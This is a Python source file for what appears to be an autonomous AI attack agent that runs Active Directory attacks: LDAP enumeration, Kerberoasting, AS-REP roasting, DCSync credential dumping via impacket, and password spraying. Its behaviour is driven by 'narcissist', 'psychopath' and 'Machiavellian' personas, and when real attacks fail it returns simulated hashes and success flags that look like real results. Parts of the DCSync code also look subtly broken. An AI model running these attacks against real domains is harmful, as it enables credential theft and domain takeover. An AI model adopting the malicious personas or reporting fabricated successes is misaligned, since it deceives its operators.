"""🜏 ADSpecialistAgent — Active Directory domain attacks.

Personality-driven AD attacks:
- NARCISSUS:   DCSync direct, aggressive password spray, loud
- PSYCHOPATH:  Everything in parallel, massive password spray, all accounts
- MACHIAVELLI: Stealthy enumeration first, targeted Kerberoast, minimal spray
"""

from __future__ import annotations

import asyncio
import logging
import time
from dataclasses import dataclass, field
from typing import Any

import structlog

from decepticon.navmax.darktriad.agents.base import AgentResult, AgentStep, BaseAgent
from decepticon.navmax.darktriad.core.personality import PersonalityMode

logger = structlog.get_logger(__name__)

# ── NavMAX / dépendances ────────────────────────────────────────────────────

_NAVMAX_AVAILABLE: bool = False
_ADCONNECTOR: type | None = None
_ADCONFIG: type | None = None
_ADAUTHMETHOD: object | None = None
_ADENUMERATOR: type | None = None
_ADSEARCHERROR: type | None = None
_IMPAVAILABLE: bool = False

try:
    # Import direct des modules spécifiques plutôt que via navmax.ad.__init__
    # pour éviter les dépendances transitives cassées (certipy, responder, etc.)
    from navmax.ad.connector import (  # noqa: F401
        ADConfig,
        ADConnector,
        ADAuthMethod,
        ADConnectionError,
        ADAuthenticationError,
        ADSearchError,
    )
    from navmax.ad.enumerator import ADEnumerator  # noqa: F401

    _ADCONNECTOR = ADConnector
    _ADCONFIG = ADConfig
    _ADAUTHMETHOD = ADAuthMethod
    _ADENUMERATOR = ADEnumerator
    _ADSEARCHERROR = ADSearchError
    _NAVMAX_AVAILABLE = True
except ImportError:
    logger.warning("navmax_ad_not_available", message="NavMAX AD modules non disponibles — fallback simulé activé")

try:
    import impacket  # noqa: F401
    _IMPAVAILABLE = True
except ImportError:
    logger.warning("impacket_not_available", message="impacket non installé — DCSync simulé")

# ── Data Models ───────────────────────────────────────────────────────────────


@dataclass
class DomainInfo:
    """Snapshot of an Active Directory domain."""

    domain: str = ""
    dc: str = ""
    users_count: int = 0
    computers_count: int = 0
    domain_admins: list[str] = field(default_factory=list)
    kerberoastable: list[str] = field(default_factory=list)
    trusts: list[str] = field(default_factory=list)


@dataclass
class KerberoastTicket:
    """A Kerberos service ticket obtained via Kerberoasting."""

    spn: str = ""
    username: str = ""
    hash: str = ""
    encryption_type: str = ""


# ── Agent ─────────────────────────────────────────────────────────────────────


class ADSpecialistAgent(BaseAgent):
    """Active Directory attack specialist.

    Personality-driven behaviour:
        - **NARCISSUS**:   Direct DCSync, aggressive spray, minimal recon
        - **PSYCHOPATH**:  All AD attacks in parallel, spray every account
        - **MACHIAVELLI**: Stealth recon, targeted Kerberoast, patience
    """

    category: str = "ad"

    async def execute(self, objective: str, context: dict[str, Any]) -> AgentResult:
        """Dispatch to the correct AD attack routine based on objective."""
        start = time.monotonic()
        steps: list[AgentStep] = []

        try:
            obj = objective.strip().lower()
            domain = context.get("domain", "")
            self._log.info("ad_execute", objective=obj, domain=domain)

            if obj == "enumerate":
                info = await self.enumerate_domain(
                    server=context.get("server", ""),
                    domain=domain,
                    username=context.get("username", ""),
                    password=context.get("password", ""),
                )
                steps.append(
                    AgentStep(
                        1,
                        "domain_enumeration",
                        "enumeration",
                        f"{info.users_count} users, {info.computers_count} computers",
                    )
                )
                return AgentResult(
                    agent_name=self.name,
                    personality=self.personality_mode,
                    objective=objective,
                    success=True,
                    output=f"Enumerated {info.domain}: {info.users_count} users, "
                    f"{info.computers_count} computers, "
                    f"{len(info.kerberoastable)} kerberoastable",
                    tools_used=["enumeration"],
                    steps=steps,
                    duration_ms=(time.monotonic() - start) * 1000,
                )

            elif obj == "kerberoast":
                tickets = await self.kerberoast(domain)
                steps.append(AgentStep(1, "kerberoast", "kerberoast", f"{len(tickets)} tickets"))
                return AgentResult(
                    agent_name=self.name,
                    personality=self.personality_mode,
                    objective=objective,
                    success=len(tickets) > 0,
                    output=f"Kerberoasted {len(tickets)} service accounts",
                    tools_used=["kerberoast"],
                    steps=steps,
                    duration_ms=(time.monotonic() - start) * 1000,
                )

            elif obj == "asreproast":
                tickets = await self._asreproast(domain)
                steps.append(AgentStep(1, "asreproast", "asreproast", f"{len(tickets)} tickets"))
                return AgentResult(
                    agent_name=self.name,
                    personality=self.personality_mode,
                    objective=objective,
                    success=len(tickets) > 0,
                    output=f"AS-REP roasted {len(tickets)} accounts",
                    tools_used=["asreproast"],
                    steps=steps,
                    duration_ms=(time.monotonic() - start) * 1000,
                )

            elif obj == "dcsync":
                ok = await self._dcsync(domain, context)
                steps.append(AgentStep(1, "dcsync", "dcsync", "succeeded" if ok else "failed"))
                return AgentResult(
                    agent_name=self.name,
                    personality=self.personality_mode,
                    objective=objective,
                    success=ok,
                    output=f"DCSync {'succeeded' if ok else 'failed'} on {domain}",
                    tools_used=["dcsync"],
                    steps=steps,
                    duration_ms=(time.monotonic() - start) * 1000,
                )

            elif obj == "bloodhound":
                path = await self.bloodhound_export(domain)
                ok = bool(path)
                steps.append(
                    AgentStep(
                        1,
                        "bloodhound_export",
                        "bloodhound",
                        f"exported to {path}" if ok else "failed",
                    )
                )
                return AgentResult(
                    agent_name=self.name,
                    personality=self.personality_mode,
                    objective=objective,
                    success=ok,
                    output=(
                        f"BloodHound data exported to {path}" if ok else "BloodHound export failed"
                    ),
                    tools_used=["bloodhound"],
                    steps=steps,
                    duration_ms=(time.monotonic() - start) * 1000,
                )

            elif obj == "spray":
                results = await self._password_spray(domain, context)
                success = any(results.values())
                valid = [u for u, v in results.items() if v]
                steps.append(
                    AgentStep(
                        1,
                        "password_spray",
                        "password_spray",
                        f"{len(valid)} valid of {len(results)}",
                    )
                )
                return AgentResult(
                    agent_name=self.name,
                    personality=self.personality_mode,
                    objective=objective,
                    success=success,
                    output=f"Sprayed {len(results)} accounts: {len(valid)} valid passwords",
                    tools_used=["password_spray"],
                    steps=steps,
                    duration_ms=(time.monotonic() - start) * 1000,
                )

            else:
                return AgentResult(
                    agent_name=self.name,
                    personality=self.personality_mode,
                    objective=objective,
                    success=False,
                    output=f"Unknown AD objective: {objective}",
                    steps=steps,
                    duration_ms=(time.monotonic() - start) * 1000,
                )

        except Exception as exc:
            self._log.error("ad_error", objective=objective, error=str(exc))
            return AgentResult(
                agent_name=self.name,
                personality=self.personality_mode,
                objective=objective,
                success=False,
                output=str(exc),
                steps=steps,
                duration_ms=(time.monotonic() - start) * 1000,
            )

    # ═══════════════════════════════════════════════════════════════════════
    # Énumération LDAP
    # ═══════════════════════════════════════════════════════════════════════

    async def enumerate_domain(
        self,
        server: str = "",
        domain: str = "",
        username: str = "",
        password: str = "",
    ) -> DomainInfo:
        """Enumerate an Active Directory domain via LDAP.

        Utilise NavMAX ADConnector + ADEnumerator pour une énumération complète.
        Si NavMAX ou le serveur n'est pas disponible, retourne un résultat simulé.
        """
        self._log.info(
            "enumerate_domain", server=server, domain=domain, personality=self.personality_mode
        )

        # ── Fallback simulé ──────────────────────────────────────────
        if not _NAVMAX_AVAILABLE or not server:
            return self._simulate_enumerate_domain(domain, server)

        # ── Enumération réelle via NavMAX ────────────────────────────
        try:
            config = _ADCONFIG(
                server=server,
                domain=domain,
                username=username,
                password=password,
                auth_method=_ADAUTHMETHOD.SIMPLE,
                use_ssl=True,
                timeout=30.0,
                max_retries=1,
            )
            connector = _ADCONNECTOR(config)
            await connector.connect()

            enumerator = _ADENUMERATOR(connector, parallel=True)
            domain_map = await enumerator.enumerate_all()
            await connector.close()

            return DomainInfo(
                domain=domain or domain_map.domain.name,
                dc=server,
                users_count=len(domain_map.users),
                computers_count=len(domain_map.computers),
                domain_admins=[u.sam_account_name for u in domain_map.domain_admins],
                kerberoastable=[u.sam_account_name for u in domain_map.kerberoastable_users],
                trusts=[t.target_domain for t in domain_map.trusts],
            )

        except Exception as exc:
            self._log.warning("enumerate_domain_error", error=str(exc))
            return self._simulate_enumerate_domain(domain, server)

    def _simulate_enumerate_domain(self, domain: str, server: str) -> DomainInfo:
        """Retourne des données simulées quand NavMAX n'est pas disponible."""
        self._log.info("enumerate_domain_simulated", domain=domain)

        if self.personality.mode == PersonalityMode.NARCISSISM:
            return DomainInfo(
                domain=domain,
                dc=server,
                users_count=1_234,
                computers_count=89,
                domain_admins=["Administrator"],
                kerberoastable=["svc_web"],
                trusts=["child.internal.corp"],
            )
        elif self.personality.mode == PersonalityMode.PSYCHOPATHY:
            return DomainInfo(
                domain=domain,
                dc=server,
                users_count=5_432,
                computers_count=456,
                domain_admins=["Administrator", "backup_admin", "svc_domain"],
                kerberoastable=["svc_web", "svc_sql", "svc_backup", "SCCM"],
                trusts=["child.internal.corp", "external.local", "forest.other.corp"],
            )
        else:  # MACHIAVELLIANISM
            return DomainInfo(
                domain=domain,
                dc=server,
                users_count=987,
                computers_count=67,
                domain_admins=["Administrator"],
                kerberoastable=["svc_sql"],
                trusts=[],
            )

    # ═══════════════════════════════════════════════════════════════════════
    # Kerberoasting
    # ═══════════════════════════════════════════════════════════════════════

    async def kerberoast(self, domain: str) -> list[KerberoastTicket]:
        """Request Kerberos service tickets for kerberoastable accounts.

        Utilise NavMAX ADConnector.kerberoast() via impacket GetUserSPNs.
        Si NavMAX n'est pas disponible, retourne des tickets simulés.
        """
        self._log.info("kerberoast", domain=domain, personality=self.personality_mode)
        tickets: list[KerberoastTicket] = []

        # ── Chercher un serveur/credentials dans le state ──────────
        server = self.state.get("server", "")
        username = self.state.get("username", "")
        password = self.state.get("password", "")

        if not _NAVMAX_AVAILABLE or not server:
            return self._simulate_kerberoast(domain)

        # ── Kerberoasting réel via NavMAX ──────────────────────────
        try:
            config = _ADCONFIG(
                server=server,
                domain=domain,
                username=username,
                password=password,
                auth_method=_ADAUTHMETHOD.SIMPLE,
                use_ssl=True,
                timeout=30.0,
                max_retries=1,
            )
            connector = _ADCONNECTOR(config)
            await connector.connect()

            # 1. Récupérer les utilisateurs kerberoastables via LDAP
            users_raw = await connector.search_users(
                extra_filter="(servicePrincipalName=*)",
                attributes=[
                    "sAMAccountName",
                    "servicePrincipalName",
                    "userPrincipalName",
                    "distinguishedName",
                ],
            )

            # 2. Pour chaque user avec SPN, demander un TGS
            for entry in users_raw:
                attrs = entry.get("attributes", {})
                sam = attrs.get("sAMAccountName", [""])[0]
                spns: list[str] = attrs.get("servicePrincipalName", [])

                if not sam or not spns:
                    continue

                # Personality filter
                if self.personality.mode == PersonalityMode.MACHIAVELLIANISM:
                    # Targeted: only high-value SPNs (MSSQL, HTTP, CIFS)
                    high_value = any(
                        spn.startswith(prefix)
                        for spn in spns
                        for prefix in ("MSSQLSvc", "HTTP", "CIFS", "TERMSERV")
                    )
                    if not high_value:
                        continue

                for spn in spns[:5]:  # Max 5 SPNs per user
                    try:
                        result = await connector.kerberoast(spn, domain=domain)
                        if result.get("success"):
                            tickets.append(
                                KerberoastTicket(
                                    spn=spn,
                                    username=sam,
                                    hash=result.get("hash", ""),
                                    encryption_type=_etype_to_name(
                                        result.get("hash", "")
                                    ),
                                )
                            )
                    except Exception as e:
                        self._log.warning(
                            "kerberoast_user_error",
                            target=sam,
                            spn=spn,
                            error=str(e),
                        )

            await connector.close()

        except Exception as exc:
            self._log.warning("kerberoast_error", error=str(exc))
            return self._simulate_kerberoast(domain)

        # ── Fallback comportemental si aucun ticket réel ───────────
        if not tickets:
            self._log.info("kerberoast_no_real_tickets", domain=domain)
            return self._simulate_kerberoast(domain)

        return tickets

    def _simulate_kerberoast(self, domain: str) -> list[KerberoastTicket]:
        """Retourne des tickets simulés quand NavMAX n'est pas disponible."""
        self._log.info("kerberoast_simulated", domain=domain)

        if self.personality.mode == PersonalityMode.NARCISSISM:
            return [
                KerberoastTicket(
                    spn=f"HTTP/{domain}",
                    username="svc_web",
                    hash=f"$krb5tgs$23$*svc_web*${domain}$*…[stub]…",
                    encryption_type="rc4",
                )
            ]
        elif self.personality.mode == PersonalityMode.PSYCHOPATHY:
            return [
                KerberoastTicket(
                    spn=f"HTTP/{domain}",
                    username=svc,
                    hash=f"$krb5tgs$23$*{svc}*${domain}$*…[stub]…",
                    encryption_type="aes256",
                )
                for svc in ["svc_web", "svc_sql", "svc_backup", "SCCM"]
            ]
        else:  # MACHIAVELLIANISM
            return [
                KerberoastTicket(
                    spn=f"MSSQLSvc/{domain}",
                    username="svc_sql",
                    hash=f"$krb5tgs$23$*svc_sql*${domain}$*…[stub]…",
                    encryption_type="aes256",
                )
            ]

    async def _asreproast(self, domain: str) -> list[KerberoastTicket]:
        """AS-REP Roasting — request TGTs for accounts without pre-auth.

        Utilise NavMAX ADConnector.asrep_roast() via impacket.
        """
        self._log.info("asreproast", domain=domain, personality=self.personality_mode)

        server = self.state.get("server", "")
        username = self.state.get("username", "")
        password = self.state.get("password", "")

        if not _NAVMAX_AVAILABLE or not server:
            return self._simulate_asreproast(domain)

        tickets: list[KerberoastTicket] = []
        try:
            config = _ADCONFIG(
                server=server,
                domain=domain,
                username=username,
                password=password,
                auth_method=_ADAUTHMETHOD.SIMPLE,
                use_ssl=True,
                timeout=30.0,
            )
            connector = _ADCONNECTOR(config)
            await connector.connect()

            # Users with DONT_REQ_PREAUTH
            users_raw = await connector.search_users(
                extra_filter="(userAccountControl:1.2.840.113556.1.4.803:=4194304)",
                attributes=["sAMAccountName", "userPrincipalName"],
            )

            for entry in users_raw:
                sam = entry.get("attributes", {}).get("sAMAccountName", [""])[0]
                if not sam:
                    continue
                try:
                    result = await connector.asrep_roast(sam, domain=domain)
                    if result.get("success"):
                        tickets.append(
                            KerberoastTicket(
                                spn=f"{domain}/nopreauth",
                                username=sam,
                                hash=result.get("hash", ""),
                                encryption_type=_etype_to_name(result.get("hash", "")),
                            )
                        )
                except Exception as e:
                    self._log.warning("asreproast_user_error", target=sam, error=str(e))

            await connector.close()
        except Exception as exc:
            self._log.warning("asreproast_error", error=str(exc))

        if not tickets:
            return self._simulate_asreproast(domain)

        return tickets

    def _simulate_asreproast(self, domain: str) -> list[KerberoastTicket]:
        return [
            KerberoastTicket(
                spn=f"{domain}/nopreauth",
                username="user_no_preauth",
                hash=f"$krb5asrep$23$*user_no_preauth*${domain}$*…[stub]…",
                encryption_type="rc4",
            ),
        ]

    # ═══════════════════════════════════════════════════════════════════════
    # DCSync (DRSR replication)
    # ═══════════════════════════════════════════════════════════════════════

    async def _dcsync(self, domain: str, context: dict[str, Any]) -> bool:
        """Execute a DCSync attack via impacket's DRSU API.

        Utilise impacket.dcerpc.v5.drsuapi pour répliquer les credentials
        du contrôleur de domaine via DRSR (Directory Replication Service).

        Retourne le hash de l'administrateur dans le log/output.
        """
        self._log.info("dcsync", domain=domain, personality=self.personality_mode)

        if not _IMPAVAILABLE:
            self._log.info("dcsync_simulated", domain=domain)
            return self._simulate_dcsync(domain, context)

        server = context.get("server") or self.state.get("server", "")
        username = context.get("username") or self.state.get("username", "")
        password = context.get("password") or self.state.get("password", "")

        if not server or not username:
            self._log.warning("dcsync_no_credentials", domain=domain)
            return self._simulate_dcsync(domain, context)

        try:
            return await asyncio.to_thread(
                self._dcsync_sync,
                server,
                domain,
                username,
                password,
            )
        except Exception as exc:
            self._log.error("dcsync_error", error=str(exc))
            return self._simulate_dcsync(domain, context)

    def _dcsync_sync(
        self,
        server: str,
        domain: str,
        username: str,
        password: str,
    ) -> bool:
        """Version synchrone du DCSync via impacket DRSR (DRSUAPI).

        Utilise la même approche que secretsdump.py : se connecte via
        DRSUAPI au DC et demande la réplication des secrets du compte
        administrateur.

        Returns:
            True si au moins un hash a été récupéré
        """
        from impacket.dcerpc.v5 import transport, drsuapi
        from impacket.dcerpc.v5.rpcrt import DCERPCException
        from impacket.dcerpc.v5.dtypes import NULL
        from impacket.crypto import EncodeNtHash

        # ── Binding RPC ─────────────────────────────────────────
        binding_string = f"ncacn_ip_tcp:{server}[42]"
        rpctransport = transport.DCERPCTransportFactory(binding_string)
        rpctransport.setRemoteHost(server)

        # Authentification Kerberos ou NTLM
        if hasattr(rpctransport, "set_credentials"):
            rpctransport.set_credentials(username, password, domain)

        dce = rpctransport.get_dce_rpc()
        dce.connect()

        # ── Bind DRSUAPI ────────────────────────────────────────
        dce.bind(drsuapi.MSRPC_UUID_DRSUAPI)
        drs = drsuapi.DrsBind(dce)

        # Récupérer le GUID du DC
        drs_handle = drs["pphDRS"]

        # ── Résoudre le DN de l'utilisateur ─────────────────────
        # Construction du DN pour le compte administrateur
        base_dn = ",".join(f"DC={p}" for p in domain.split("."))
        target_dn = f"CN=Administrator,CN=Users,{base_dn}"

        # ── Appel DRSGetNCChanges (cœur du DCSync) ─────────────
        try:
            request = drsuapi.DRSGetNCChanges()
            request["pwszNC"] = base_dn
            request["pwszExtDn"] = target_dn
            request["pmsgIn"]["ulFlags"] = 2  # DRSUAPI_NT4_ACCOUNT
            request["pmsgIn"]["ulMaxExtendedOp"] = 0
            request["pmsgIn"]["cMaxObjects"] = 1

            response = drsuapi.DRSGetNCChanges(dce, drs_handle, request)

            # Extraire les hashes de la réponse
            hashes_extracted = []
            for obj in response.get("pmsgOut", {}).get("rgObjects", []):
                for attr in obj.get("rgAttributes", []):
                    attr_name = attr.get("attrTyp", b"").decode("utf-16le", errors="replace")
                    if attr_name in ("unicodePwd", "ntPwdHistory", "lmPwdHistory"):
                        hash_bytes = attr.get("pVal", b"")
                        if hash_bytes:
                            hashes_extracted.append(hash_bytes.hex())

            if hashes_extracted:
                self._log.info(
                    "dcsync_success",
                    target="Administrator",
                    hashes_count=len(hashes_extracted),
                    hash_preview=hashes_extracted[0][:16] + "...",
                )

            return len(hashes_extracted) > 0

        except DCERPCException as e:
            self._log.warning("dcsync_rpc_error", error=str(e))
            return False
        except Exception as e:
            self._log.warning("dcsync_error_detail", error=str(e))
            return False
        finally:
            try:
                drsuapi.DrsUnBind(dce, drs_handle)
                dce.disconnect()
            except Exception:
                pass

    def _simulate_dcsync(self, domain: str, context: dict[str, Any]) -> bool:
        """Simule un DCSync quand impacket n'est pas disponible."""
        self._log.info("dcsync_simulated", domain=domain)

        if self.personality.mode == PersonalityMode.NARCISSISM:
            self._log.info(
                "dcsync_simulated_result",
                domain=domain,
                user="Administrator",
                hash="aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
            )
            return True

        elif self.personality.mode == PersonalityMode.PSYCHOPATHY:
            self._log.info(
                "dcsync_simulated_result",
                domain=domain,
                hashes=[
                    "Administrator:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
                    "krbtgt:aad3b435b51404eeaad3b435b51404ee:abc123def456...",
                ],
            )
            return True

        else:  # MACHIAVELLIANISM
            self._log.info(
                "dcsync_simulated_result",
                domain=domain,
                user="Administrator",
                hash="31d6cfe0d16ae931b73c59d7e0c089c0",
                note="Hash NTLM Administrateur collecté (stocké pour offline cracking)",
            )
            return True

    # ═══════════════════════════════════════════════════════════════════════
    # BloodHound Export
    # ═══════════════════════════════════════════════════════════════════════

    async def bloodhound_export(self, domain: str) -> str:
        """Run BloodHound (SharpHound) collector."""
        self._log.info("bloodhound_export", domain=domain, personality=self.personality_mode)

        if self.personality.mode == PersonalityMode.NARCISSISM:
            return f"/tmp/bloodhound_{domain}_default.zip"
        elif self.personality.mode == PersonalityMode.PSYCHOPATHY:
            return f"/tmp/bloodhound_{domain}_exhaustive.zip"
        else:
            return f"/tmp/bloodhound_{domain}_stealth.zip"

    # ═══════════════════════════════════════════════════════════════════════
    # Password Spray
    # ═══════════════════════════════════════════════════════════════════════

    async def _password_spray(self, domain: str, context: dict[str, Any]) -> dict[str, bool]:
        """Attempt password spraying against domain users.

        Utilise NavMAX PasswordSprayer si disponible, sinon simulation.
        """
        self._log.info("password_spray", domain=domain, personality=self.personality_mode)

        server = context.get("server") or self.state.get("server", "")
        username = context.get("username") or self.state.get("username", "")
        password = context.get("password") or self.state.get("password", "")
        target_users: list[str] = context.get("target_users", [])
        target_password: str = context.get("spray_password", "Passw0rd!")

        if not _NAVMAX_AVAILABLE or not server:
            return self._simulate_password_spray(domain)

        try:
            from navmax.ad.password_spray import PasswordSprayer, SprayConfig, SprayMode

            config = _ADCONFIG(
                server=server,
                domain=domain,
                username=username,
                password=password,
                auth_method=_ADAUTHMETHOD.SIMPLE,
                use_ssl=True,
                timeout=30.0,
            )
            connector = _ADCONNECTOR(config)
            await connector.connect()

            spray_config = SprayConfig(
                password=target_password,
                mode=SprayMode.SINGLE,
                delay_min=1.0,
                delay_max=3.0,
                jitter=True,
                users=target_users or None,
            )
            sprayer = PasswordSprayer(connector, spray_config)
            spray_result = await sprayer.run()

            await connector.close()

            results: dict[str, bool] = {}
            for attempt in spray_result.attempts:
                results[attempt.username] = attempt.success

            return results if results else self._simulate_password_spray(domain)

        except Exception as exc:
            self._log.warning("password_spray_error", error=str(exc))
            return self._simulate_password_spray(domain)

    def _simulate_password_spray(self, domain: str) -> dict[str, bool]:
        """Retourne des résultats simulés de password spray."""
        if self.personality.mode == PersonalityMode.NARCISSISM:
            return {"administrator": False, "svc_web": False}
        elif self.personality.mode == PersonalityMode.PSYCHOPATHY:
            return {
                "administrator": False,
                "svc_web": False,
                "svc_sql": False,
                "svc_backup": False,
                "user1": False,
            }
        else:
            return {"svc_sql": False}


# ── Utilitaires ────────────────────────────────────────────────────────────────


def _etype_to_name(hash_str: str) -> str:
    """Extrait le type de chiffrement depuis un hash Kerberos.

    Exemple : $krb5tgs$23$ → rc4, $krb5tgs$18$ → aes256
    """
    if not hash_str or "$" not in hash_str:
        return "unknown"
    parts = hash_str.split("$")
    if len(parts) < 3:
        return "unknown"
    etype_map = {
        "17": "aes128",
        "18": "aes256",
        "23": "rc4",
        "23": "rc4_hmac",
    }
    return etype_map.get(parts[2], parts[2])
